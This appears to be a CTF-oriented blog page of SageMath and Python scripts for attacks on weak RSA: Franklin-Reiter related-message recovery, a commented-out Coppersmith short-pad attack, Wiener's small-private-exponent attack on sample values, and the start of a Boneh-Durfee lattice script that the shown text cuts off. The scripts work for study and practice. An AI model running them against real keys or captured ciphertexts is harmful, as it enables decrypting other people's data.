<figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Franklin-Reiter attack against RSA.</span></span><br><span class="line"><span class="comment"># If two messages differ only by a known fixed difference between the two messages</span></span><br><span class="line"><span class="comment"># and are RSA encrypted under the same RSA modulus N</span></span><br><span class="line"><span class="comment"># then it is possible to recover both of them.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Inputs are modulus, known difference, ciphertext 1, ciphertext2.</span></span><br><span class="line"><span class="comment"># Ciphertext 1 corresponds to smaller of the two plaintexts. (The one without the fixed difference added to it)</span></span><br><span class="line">def franklinReiter(n,e,r,c1,c2):</span><br><span class="line">    R.&lt;X&gt; = <span class="type">Zmod</span>(n)[]</span><br><span class="line">    f1 = X^e - c1</span><br><span class="line">    f2 = (X + r)^e - c2</span><br><span class="line">    <span class="comment"># coefficient 0 = -m, which is what we wanted!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="type">Integer</span>(n-(compositeModulusGCD(f1,f2)).coefficients()[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">  <span class="comment"># GCD is not implemented for rings over composite modulus in Sage</span></span><br><span class="line">  <span class="comment"># so we do our own implementation. Its the exact same as standard GCD, but with</span></span><br><span class="line">  <span class="comment"># the polynomials monic representation</span></span><br><span class="line">def compositeModulusGCD(a, b):</span><br><span class="line">    <span class="keyword">if</span>(b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> a.monic()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> compositeModulusGCD(b, a % b)</span><br><span class="line"></span><br><span class="line">'''def <span class="type">CoppersmithShortPadAttack</span>(e,n,<span class="type">C1</span>,<span class="type">C2</span>,eps=<span class="number">1</span>/<span class="number">30</span>):</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Coppersmith's Shortpad attack!</span></span><br><span class="line"><span class="string">    Figured out from: https://en.wikipedia.org/wiki/Coppersmith's_attack#Coppersmith.E2.80.99s_short-pad_attack</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">import</span> binascii</span><br><span class="line">    P.&lt;x,y&gt; = <span class="type">PolynomialRing</span>(<span class="type">ZZ</span>)</span><br><span class="line">    <span class="type">ZmodN</span> = <span class="type">Zmod</span>(n)</span><br><span class="line">    g1 = x^e - <span class="type">C1</span></span><br><span class="line">    g2 = (x+y)^e - <span class="type">C2</span></span><br><span class="line">    res = g1.resultant(g2)</span><br><span class="line">    P.&lt;y&gt; = <span class="type">PolynomialRing</span>(<span class="type">ZmodN</span>)</span><br><span class="line">    <span class="comment"># Convert Multivariate Polynomial Ring to Univariate Polynomial Ring</span></span><br><span class="line">    rres = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len(res.coefficients())):</span><br><span class="line">        rres += res.coefficients()[i]*(y^(res.exponents()[i][<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">    diff = rres.small_roots(epsilon=eps)</span><br><span class="line">    recoveredM1 = franklinReiter(n,e,diff[<span class="number">0</span>],<span class="type">C1</span>,<span class="type">C2</span>)</span><br><span class="line">    print(recoveredM1)</span><br><span class="line">    print(<span class="string">"Message is the following hex, but potentially missing some zeroes in the binary from the right end"</span>)</span><br><span class="line">    print(hex(recoveredM1))</span><br><span class="line">    print(<span class="string">"Message is one of:"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        msg = hex(<span class="type">Integer</span>(recoveredM1*pow(<span class="number">2</span>,i)))</span><br><span class="line">        <span class="keyword">if</span>(len(msg)%<span class="number">2</span> == <span class="number">1</span>):</span><br><span class="line">            msg = '<span class="number">0</span>' + msg</span><br><span class="line">        <span class="keyword">if</span>(msg[:<span class="number">2</span>]=='<span class="number">0</span>x'):</span><br><span class="line">            msg = msg[:<span class="number">2</span>]</span><br><span class="line">        print(binascii.unhexlify(msg))</span><br><span class="line"></span><br><span class="line">def testCoppersmithShortPadAttack(eps=<span class="number">1</span>/<span class="number">25</span>):</span><br><span class="line">    <span class="keyword">from</span> <span class="type">Crypto</span>.<span class="type">PublicKey</span> <span class="keyword">import</span> <span class="type">RSA</span></span><br><span class="line">    <span class="keyword">import</span> random</span><br><span class="line">    <span class="keyword">import</span> math</span><br><span class="line">    <span class="keyword">import</span> binascii</span><br><span class="line">    M = <span class="string">"flag&#123;This_Msg_Is_2_1337&#125;"</span></span><br><span class="line">    M = <span class="built_in">int</span>(binascii.hexlify(M),<span class="number">16</span>)</span><br><span class="line">    e = <span class="number">3</span></span><br><span class="line">    nBitSize =  <span class="number">8192</span></span><br><span class="line">    key = <span class="type">RSA</span>.generate(nBitSize)</span><br><span class="line">    <span class="comment">#Give a bit of room, otherwhise the epsilon has to be tiny, and small roots will take forever</span></span><br><span class="line">    m = <span class="built_in">int</span>(math.floor(nBitSize/(e*e))) - <span class="number">400</span></span><br><span class="line">    assert (m &lt; nBitSize - len(bin(M)[<span class="number">2</span>:]))</span><br><span class="line">    r1 = random.randint(<span class="number">1</span>,pow(<span class="number">2</span>,m))</span><br><span class="line">    r2 = random.randint(r1,pow(<span class="number">2</span>,m))</span><br><span class="line">    <span class="type">M1</span> = pow(<span class="number">2</span>,m)*M + r1</span><br><span class="line">    <span class="type">M2</span> = pow(<span class="number">2</span>,m)*M + r2</span><br><span class="line">    <span class="type">C1</span> = <span class="type">Integer</span>(pow(<span class="type">M1</span>,e,key.n))</span><br><span class="line">    <span class="type">C2</span> = <span class="type">Integer</span>(pow(<span class="type">M2</span>,e,key.n))</span><br><span class="line">    <span class="type">CoppersmithShortPadAttack</span>(e,key.n,<span class="type">C1</span>,<span class="type">C2</span>,eps)'''</span><br><span class="line"></span><br><span class="line">def testFranklinReiter():</span><br><span class="line">    p = random_prime(<span class="number">2</span>^<span class="number">512</span>)</span><br><span class="line">    q = random_prime(<span class="number">2</span>^<span class="number">512</span>)</span><br><span class="line">    n = p * q <span class="comment"># 1024-bit modulus</span></span><br><span class="line">    e = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    m = randint(<span class="number">0</span>, n) <span class="comment"># some message we want to recover</span></span><br><span class="line">    r = randint(<span class="number">0</span>, n) <span class="comment"># random padding</span></span><br><span class="line"></span><br><span class="line">    c1 = pow(m + <span class="number">0</span>, e, n)</span><br><span class="line">    c2 = pow(m + r, e, n)</span><br><span class="line">    print(m)</span><br><span class="line">    recoveredM = franklinReiter(n,e,r,c1,c2)</span><br><span class="line">    print(recoveredM)</span><br><span class="line">    assert recoveredM==m</span><br><span class="line">    print(<span class="string">"They are equal!"</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="type">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">testFranklinReiter()</span><br></pre></td></tr></table></figure>

<h2 id="wiener‘s-Attack"><a href="#wiener‘s-Attack" class="headerlink" title="wiener‘s Attack"></a>wiener‘s Attack</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transform</span><span class="params">(x,y)</span>:</span>       <span class="comment">#使用辗转相处将分数 x/y 转为连分数的形式</span></span><br><span class="line">    res=[]</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        res.append(x//y)</span><br><span class="line">        x,y=y,x%y</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">continued_fraction</span><span class="params">(sub_res)</span>:</span></span><br><span class="line">    numerator,denominator=<span class="number">1</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sub_res[::<span class="number">-1</span>]:      <span class="comment">#从sublist的后面往前循环</span></span><br><span class="line">        denominator,numerator=numerator,i*numerator+denominator</span><br><span class="line">    <span class="keyword">return</span> denominator,numerator   <span class="comment">#得到渐进分数的分母和分子，并返回</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#求解每个渐进分数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_fraction</span><span class="params">(x,y)</span>:</span></span><br><span class="line">    res=transform(x,y)</span><br><span class="line">    res=list(map(continued_fraction,(res[<span class="number">0</span>:i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(res)))))  <span class="comment">#将连分数的结果逐一截取以求渐进分数</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pq</span><span class="params">(a,b,c)</span>:</span>      <span class="comment">#由p+q和pq的值通过维达定理来求解p和q</span></span><br><span class="line">    par=gmpy2.isqrt(b*b<span class="number">-4</span>*a*c)   <span class="comment">#由上述可得，开根号一定是整数，因为有解</span></span><br><span class="line">    x1,x2=(-b+par)//(<span class="number">2</span>*a),(-b-par)//(<span class="number">2</span>*a)</span><br><span class="line">    <span class="keyword">return</span> x1,x2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wienerAttack</span><span class="params">(e,n)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> (d,k) <span class="keyword">in</span> sub_fraction(e,n):  <span class="comment">#用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数</span></span><br><span class="line">        <span class="keyword">if</span> k==<span class="number">0</span>:                     <span class="comment">#可能会出现连分数的第一个为0的情况，排除</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e*d<span class="number">-1</span>)%k!=<span class="number">0</span>:             <span class="comment">#ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        phi=(e*d<span class="number">-1</span>)//k               <span class="comment">#这个结果就是 φ(n)</span></span><br><span class="line">        px,qy=get_pq(<span class="number">1</span>,n-phi+<span class="number">1</span>,n)</span><br><span class="line">        <span class="keyword">if</span> px*qy==n:</span><br><span class="line">            p,q=abs(int(px)),abs(int(qy))     <span class="comment">#可能会得到两个负数，负负得正未尝不会出现</span></span><br><span class="line">            d=gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))     <span class="comment">#求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d</span></span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">    print(<span class="string">"该方法不适用"</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">e = <span class="number">14058695417015334071588010346586749790539913287499707802938898719199384604316115908373997739604466972535533733290829894940306314501336291780396644520926473</span></span><br><span class="line">n = <span class="number">33608051123287760315508423639768587307044110783252538766412788814888567164438282747809126528707329215122915093543085008547092423658991866313471837522758159</span></span><br><span class="line">d=wienerAttack(e,n)</span><br><span class="line">print(<span class="string">"d="</span>,d)</span><br></pre></td></tr></table></figure>

<h2 id="wiener‘s-Attack失效时"><a href="#wiener‘s-Attack失效时" class="headerlink" title="wiener‘s Attack失效时"></a>wiener‘s Attack失效时</h2><p>利用条件：已知给出n,e,c  （e很大）  (.sage)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Config</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Setting debug to true will display more informations</span></span><br><span class="line"><span class="string">about the lattice, the bounds, the vectors...</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Setting strict to true will stop the algorithm (and</span></span><br><span class="line"><span class="string">return (-1, -1)) if we don't have a correct </span></span><br><span class="line"><span class="string">upperbound on the determinant. Note that this </span></span><br><span class="line"><span class="string">doesn't necesseraly mean that no solutions </span></span><br><span class="line"><span class="string">will be found since the theoretical upperbound is</span></span><br><span class="line"><span class="string">usualy far away from actual results. That is why</span></span><br><span class="line"><span class="string">you should probably use `strict = False`</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">This is experimental, but has provided remarkable results</span></span><br><span class="line"><span class="string">so far. It tries to reduce the lattice as much as it can</span></span><br><span class="line"><span class="string">while keeping its efficiency. I see no reason not to use</span></span><br><span class="line"><span class="string">this option, but if things don't work, you should try</span></span><br><span class="line"><span class="string">disabling it</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># stop removing if lattice reaches that dimension</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Functions</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display stats on helpful vectors</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">helpful_vectors</span><span class="params">(BB, modulus)</span>:</span></span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> nothelpful, <span class="string">"/"</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">" vectors are not helpful"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display matrix picture with 0 and X</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">matrix_overview</span><span class="params">(BB, bound)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">'%02d '</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">'0'</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">'X'</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:</span><br><span class="line">                a += <span class="string">' '</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">'~'</span></span><br><span class="line">        <span class="keyword">print</span> a</span><br><span class="line"></span><br><span class="line"><span class="comment"># tries to remove unhelpful vectors</span></span><br><span class="line"><span class="comment"># we start at current = n-1 (last vector)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_unhelpful</span><span class="params">(BB, monomials, bound, current)</span>:</span></span><br><span class="line">    <span class="comment"># end of our recursive function</span></span><br><span class="line">    <span class="keyword">if</span> current == <span class="number">-1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we start by checking from the end</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(current, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        <span class="comment"># if it is unhelpful:</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">            <span class="comment"># let's check if it affects other vectors</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> range(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># if another vector is affected:</span></span><br><span class="line">                <span class="comment"># we increase the count</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:0</span></span><br><span class="line">            <span class="comment"># if no other vectors end up affected</span></span><br><span class="line">            <span class="comment"># we remove it</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"* removing unhelpful vector"</span>, ii</span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii<span class="number">-1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:1</span></span><br><span class="line">            <span class="comment"># if just one was affected we check</span></span><br><span class="line">            <span class="comment"># if it is affecting someone else</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> range(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># if it is affecting even one vector</span></span><br><span class="line">                    <span class="comment"># we give up on this one</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># remove both it if no other vector was affected and</span></span><br><span class="line">                <span class="comment"># this helpful vector is not helpful enough</span></span><br><span class="line">                <span class="comment"># compared to our unhelpful one</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> abs(bound - BB[affected_vector_index, affected_vector_index]) &lt; abs(bound - BB[ii, ii]):</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"* removing unhelpful vectors"</span>, ii, <span class="string">"and"</span>, affected_vector_index</span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii<span class="number">-1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line"><span class="string">""" </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1,-1 if `strict=true`, and determinant doesn't bound</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 